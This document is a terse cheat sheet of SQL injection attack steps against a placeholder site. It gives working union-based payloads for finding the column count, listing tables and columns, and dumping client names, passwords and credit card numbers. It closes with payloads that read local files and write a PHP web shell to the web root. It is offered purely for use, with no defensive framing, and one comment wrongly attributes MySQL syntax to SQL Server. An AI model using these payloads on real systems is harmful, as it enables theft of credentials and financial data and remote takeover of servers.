SQL Injection attack steps(start from -> http://vulnsite.com/clients.php?id=150):

	# Important note! For Sql injection comments (--) to work, you need to include a space at the end (-- ) or (-- -) 

	Step 1: id=150'	-> if sql error is not visible, you need to do blind SQL injection

	Step 2: id=150 order by 1--
	# Try to use ;# at the end to comment out the next query
	# Increment the order number until you hit error to find out how many columns there are
	# Say there are 8 columns (error at 'order by 9'

	Step 3: id=150 union select 1,2,3,4,5,6,7,8
	# See what column numbers appear on the website somewhere, those are vulnerable
	# Say we only see column 3, 5 and 8 on the screen

	Step 4: id=150 union all select 1,2,user(),4,@@version,6,7,8

	Step 5: id=150 union all select 1,2,3,4,table_name,6,7,8 FROM information_schema.tables
	# extract all tablenames
	# This is the syntax for SQL Server, might not work for other SQL versions

	Step 6: id=150 union all select 1,2,3,4,5,6,7,column_name FROM information_schema.columns where table_name='<tableName>'
	# Say we find table 'clients' with columns 'name', 'password', 'credit_card', 'not_important'

	Step 7: id=150 union select 1,2,name,4,password,6,7,credit_card FROM clients
	# This will dump all the data on the website for us to see
	# (if it's a stored SQL injection, anyone who browses to that page will see the data dump)


Sql injection queries:

	Load a file's contents if permission is enabled:
		
		syntax : id=150 union all select 1,2,3,4,5,6,7,load_file("<remoteFilePath>")
		example: id=150 union all select 1,2,3,4,5,6,7,load_file("c:\Users\Derrick\Desktop\password.txt")

	Upload a file to a remote server if permission is enabled:
		
		syntax : id=150 union all select 1,2,3,4,"<contents>",6,7,8 into outfile '<outFile>'
		example: id=150 union all select 1,2,3,4,"<?php echo shell_exec($_REQUEST['cmd']);?>",6,7,8 into outfile '/var/www/html/upload.php'
